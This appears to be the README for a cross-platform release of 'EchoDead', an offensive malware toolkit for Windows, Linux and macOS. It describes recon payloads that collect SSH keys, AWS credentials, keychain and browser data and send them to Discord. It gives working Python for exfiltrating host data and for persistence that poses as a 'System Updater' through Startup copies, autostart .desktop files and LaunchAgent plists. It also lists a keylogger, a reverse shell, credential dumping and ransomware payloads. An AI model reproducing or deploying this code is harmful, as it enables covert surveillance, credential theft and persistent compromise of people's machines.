# 🌐 **ECHODEAD CROSS-PLATFORM SUPPORT**

## Overview

EchoDead now supports **Windows, Linux, and macOS** with intelligent platform detection and OS-specific payloads.

---

## 🎯 **New Platform Capabilities**

### 1. **Platform Detection** (`src/platform_utils.py`)

Automatically detects the target operating system and adapts accordingly.

#### Features:
- ✅ **OS Detection**: Windows, Linux, macOS
- ✅ **Admin/Root Detection**: Check privilege level
- ✅ **Architecture Detection**: x86, x64, ARM
- ✅ **Environment Info**: Python version, hostname, user
- ✅ **Cross-Platform Commands**: Unified API for all OS
- ✅ **Path Helpers**: Find startup folders, browser data, documents

#### Usage:
```python
from src.platform_utils import PlatformDetector, CrossPlatformCommand, PathHelper

# Detect OS
os = PlatformDetector.get_os()  # Returns: 'windows', 'linux', or 'macos'

# Check privileges
is_admin = PlatformDetector.is_admin()  # True/False

# Get detailed info
info = PlatformDetector.get_detailed_info()
# Returns: {os, system, release, version, machine, processor, architecture, etc.}

# Execute commands cross-platform
stdout, stderr, code = CrossPlatformCommand.run_command('whoami')

# Get username (works on all OS)
username = CrossPlatformCommand.get_username()

# Find startup directory for persistence
startup_dir = PathHelper.get_startup_dir()
# Windows: C:\Users\User\AppData\Roaming\...\Startup
# Linux: ~/.config/autostart
# macOS: ~/Library/LaunchAgents

# Find browser data directories
browsers = PathHelper.get_browser_data_dirs()
# Returns: {'chrome': Path, 'firefox': Path, 'edge': Path, ...}
```

---

## 🐧 **Linux Support**

### New Linux Payloads:

#### **linux_recon.py** - Complete Linux Reconnaissance
Gathers comprehensive system information on Linux systems.

**Collected Data:**
- ✅ OS version (`/etc/os-release`, `uname -a`)
- ✅ Kernel version and architecture
- ✅ User information (`whoami`, `id`, `groups`)
- ✅ Sudo access detection (`sudo -n -l`)
- ✅ Network interfaces (`ip addr`, `ifconfig`)
- ✅ Listening ports (`ss -tuln`, `netstat`)
- ✅ Package manager detection (dpkg, rpm, pacman)
- ✅ Installed software count
- ✅ Interesting binaries (nmap, wireshark, docker, kubectl)
- ✅ Running services (`systemctl`, `ps aux`)
- ✅ Disk usage and mount points
- ✅ SSH keys (`~/.ssh`)
- ✅ Bash history (last 30 commands)
- ✅ SELinux/AppArmor status
- ✅ Firewall rules (`iptables`, `ufw`)
- ✅ SUID binaries (privilege escalation vectors)
- ✅ World-writable files
- ✅ Cron jobs (user and system)

**Usage:**
```bash
python example_payloads/linux_recon.py
# Automatically exfiltrates to Discord
```

**Example Output (Discord):**
```
🐧 LINUX SYSTEM RECONNAISSANCE

Target: ubuntu-server
User: john
OS: Ubuntu 22.04.3 LTS
Kernel: 5.15.0-76-generic
Architecture: x86_64

PRIVILEGE STATUS:
• Root Access: ❌ NO
• Sudo Access: ✅ YES
• UID: 1000
• Groups: john sudo docker

NETWORK:
• Hostname: ubuntu-server
• Listening Services: 12 ports

SECURITY:
• SELinux: Disabled
• SUID Binaries: 37 found

INTERESTING BINARIES:
python3: /usr/bin/python3
docker: /usr/bin/docker
nmap: /usr/bin/nmap
netcat: /usr/bin/nc
```

---

## 🍎 **macOS Support**

### New macOS Payloads:

#### **macos_recon.py** - Complete macOS Reconnaissance
Gathers comprehensive system information on macOS systems.

**Collected Data:**
- ✅ macOS version (`sw_vers`)
- ✅ Hardware model and serial number
- ✅ CPU and memory information (`sysctl`)
- ✅ User accounts (`dscl`)
- ✅ Admin users
- ✅ Sudo access detection
- ✅ Network configuration (`ifconfig`, `networksetup`)
- ✅ WiFi SSID and status
- ✅ SIP (System Integrity Protection) status
- ✅ Gatekeeper status
- ✅ FileVault encryption status
- ✅ Firewall status
- ✅ Installed applications (`/Applications`, Homebrew, Mac App Store)
- ✅ Browser data (Safari, Chrome, Firefox)
- ✅ Keychain information (`security`)
- ✅ Launch Agents and Daemons (persistence)
- ✅ Login items
- ✅ Shell history (bash, zsh, fish)
- ✅ SSH keys, AWS credentials
- ✅ Recent downloads and desktop files

**Usage:**
```bash
python example_payloads/macos_recon.py
# Automatically exfiltrates to Discord
```

**Example Output (Discord):**
```
🍎 MACOS SYSTEM RECONNAISSANCE

Target: MacBook-Pro.local
User: alice
macOS: 14.1.1 (23B81)
Model: MacBookPro18,1
CPU: Apple M1 Pro

SECURITY STATUS:
• SIP: System Integrity Protection status: enabled.
• Gatekeeper: assessments enabled
• FileVault: FileVault is On.
• Firewall: Firewall is enabled.

USER INFO:
• Current User: alice
• Sudo Access: ✅ YES
• Groups: alice admin staff

NETWORK:
• WiFi SSID: HomeNetwork
• Hostname: MacBook-Pro.local

PERSISTENCE:
• Launch Agents: 8 user agents found
```

---

## 🔄 **Cross-Platform Payload Examples**

### Example 1: Universal System Info Exfiltration

```python
from src.platform_utils import PlatformDetector, CrossPlatformCommand
from src.webhook_utils import send_to_discord

def universal_system_info():
    """Works on Windows, Linux, and macOS"""
    
    # Detect platform
    os = PlatformDetector.get_os()
    info = PlatformDetector.get_detailed_info()
    is_admin = PlatformDetector.is_admin()
    
    # Get username (cross-platform)
    username = CrossPlatformCommand.get_username()
    hostname = CrossPlatformCommand.get_hostname()
    
    # Build message
    message = f"""
🌐 UNIVERSAL SYSTEM INFO

**Platform:** {os.upper()}
**User:** {username}
**Hostname:** {hostname}
**Admin/Root:** {'✅ YES' if is_admin else '❌ NO'}
**Architecture:** {info['architecture']}
**Python:** {info['python_version']}

**System:**
• OS: {info['system']} {info['release']}
• Machine: {info['machine']}
• Processor: {info['processor']}
"""
    
    send_to_discord(message)

if __name__ == "__main__":
    universal_system_info()
```

---

### Example 2: Cross-Platform Persistence

```python
from src.platform_utils import PlatformDetector, PathHelper
from pathlib import Path
import shutil

def install_persistence(payload_path: str):
    """Install persistence on Windows, Linux, or macOS"""
    
    startup_dir = PathHelper.get_startup_dir()
    
    if not startup_dir:
        print("❌ Could not find startup directory")
        return False
    
    if PlatformDetector.is_windows():
        # Windows: Copy to Startup folder
        dest = startup_dir / "updater.py"
        shutil.copy(payload_path, dest)
        print(f"✅ Installed to Windows Startup: {dest}")
    
    elif PlatformDetector.is_linux():
        # Linux: Create .desktop file in autostart
        desktop_file = startup_dir / "updater.desktop"
        with open(desktop_file, 'w') as f:
            f.write(f"""[Desktop Entry]
Type=Application
Name=System Updater
Exec=python3 {payload_path}
Hidden=false
X-GNOME-Autostart-enabled=true
""")
        print(f"✅ Installed to Linux autostart: {desktop_file}")
    
    elif PlatformDetector.is_macos():
        # macOS: Create LaunchAgent plist
        plist_file = startup_dir / "com.system.updater.plist"
        with open(plist_file, 'w') as f:
            f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{payload_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")
        print(f"✅ Installed to macOS LaunchAgents: {plist_file}")
    
    return True
```

---

### Example 3: Cross-Platform Network Scanner

```python
from src.platform_utils import PlatformDetector, CrossPlatformCommand

def scan_network():
    """Scan local network on any OS"""
    
    # Get network interfaces
    interfaces = CrossPlatformCommand.get_network_interfaces()
    
    message = f"🌐 **NETWORK SCAN**\n\n**Interfaces:**\n"
    
    for iface, ip in interfaces.items():
        message += f"• {iface}: {ip}\n"
    
    # Get active connections (cross-platform command)
    if PlatformDetector.is_windows():
        stdout, _, _ = CrossPlatformCommand.run_command('netstat -ano')
    else:
        stdout, _, _ = CrossPlatformCommand.run_command('netstat -tupn')
    
    # Count connections
    connections = len([l for l in stdout.split('\n') if 'ESTABLISHED' in l])
    message += f"\n**Active Connections:** {connections}"
    
    send_to_discord(message)
```

---

## 📊 **Platform Compatibility Matrix**

| Feature | Windows | Linux | macOS |
|---------|---------|-------|-------|
| **Platform Detection** | ✅ | ✅ | ✅ |
| **Admin Detection** | ✅ | ✅ | ✅ |
| **System Info** | ✅ | ✅ | ✅ |
| **Network Info** | ✅ | ✅ | ✅ |
| **Process List** | ✅ | ✅ | ✅ |
| **Browser Data** | ✅ | ✅ | ✅ |
| **Startup Persistence** | ✅ | ✅ | ✅ |
| **Command Execution** | ✅ | ✅ | ✅ |
| **Path Helpers** | ✅ | ✅ | ✅ |

---

## 🎯 **Payload Summary**

### Windows Payloads (19 existing):
- system_info.py, wifi_grabber.py, keylogger.py, browser_history_exfil.py
- screenshot_capture.py, webcam_capture.py, clipboard_monitor.py
- network_scanner.py, port_scanner.py, reverse_shell.py
- persistence.py, credential_dump.py, ransomware_sim.py
- discord_bot.py, process_monitor.py, av_checker.py
- file_exfil.py, usb_monitor.py, wmi_recon.py
- **lateral_movement.py**, **privilege_escalation.py**

### Linux Payloads (NEW):
- ✅ **linux_recon.py** - Complete Linux reconnaissance

### macOS Payloads (NEW):
- ✅ **macos_recon.py** - Complete macOS reconnaissance

### Cross-Platform Utilities:
- ✅ **platform_utils.py** - Platform detection and cross-platform command execution

---

## 🚀 **Testing Cross-Platform Features**

### Test 1: Platform Detection
```bash
python src/platform_utils.py
```

**Expected Output:**
- Detects current OS (Windows/Linux/macOS)
- Shows admin/root status
- Lists network interfaces
- Shows browser data directories
- Displays startup folder location

---

### Test 2: Linux Recon (on Linux system)
```bash
python example_payloads/linux_recon.py
```

**What happens:**
1. Gathers comprehensive Linux system info
2. Checks for sudo access
3. Enumerates installed software
4. Finds SUID binaries
5. Checks security settings (SELinux, AppArmor, firewall)
6. Exfiltrates to Discord

---

### Test 3: macOS Recon (on macOS system)
```bash
python example_payloads/macos_recon.py
```

**What happens:**
1. Gathers macOS system info (version, hardware, serial)
2. Checks security settings (SIP, FileVault, Gatekeeper)
3. Enumerates applications and Homebrew packages
4. Finds browser data and keychain info
5. Lists launch agents (persistence)
6. Exfiltrates to Discord

---

## 💡 **Best Practices**

### 1. **Always Detect Platform First**
```python
from src.platform_utils import PlatformDetector

if PlatformDetector.is_windows():
    # Windows-specific code
    pass
elif PlatformDetector.is_linux():
    # Linux-specific code
    pass
elif PlatformDetector.is_macos():
    # macOS-specific code
    pass
```

### 2. **Use Cross-Platform Commands**
```python
from src.platform_utils import CrossPlatformCommand

# Instead of os.system() or subprocess directly:
stdout, stderr, code = CrossPlatformCommand.run_command('whoami')
```

### 3. **Use Path Helpers**
```python
from src.platform_utils import PathHelper

# Cross-platform paths:
home = PlatformDetector.get_home_dir()
startup = PathHelper.get_startup_dir()
documents = PathHelper.get_documents_dir()
```

### 4. **Test on Multiple Platforms**
Always test payloads on:
- Windows 10/11
- Linux (Ubuntu, Debian, CentOS, Arch)
- macOS (10.15+, M1/M2)

---

## 📦 **Updated Project Stats**

```
Total Payloads: 23 (19 Windows + 2 Linux + 2 macOS)
Cross-Platform Support: ✅ Windows, Linux, macOS
Platform Detection: ✅ Automatic
Command Execution: ✅ Unified API
Path Resolution: ✅ Cross-platform helpers
Persistence: ✅ All three platforms
```

---

## 🎊 **Migration Guide**

### For Existing Payloads:

**Before (Windows-only):**
```python
import os

username = os.environ.get('USERNAME')
startup = 'C:\\Users\\User\\AppData\\Roaming\\...\\Startup'
```

**After (Cross-platform):**
```python
from src.platform_utils import CrossPlatformCommand, PathHelper

username = CrossPlatformCommand.get_username()
startup = PathHelper.get_startup_dir()
```

---

## 🔮 **Future Enhancements**

Planned for v4.0:
- 📱 Android support (via Termux)
- 🪟 PowerShell Core integration
- 🐳 Docker container detection
- ☁️ Cloud platform detection (AWS, Azure, GCP)
- 🎯 Automated cross-platform payload generation

---

**EchoDead now works on any operating system. Write once, deploy everywhere.** 🌐💀⚡
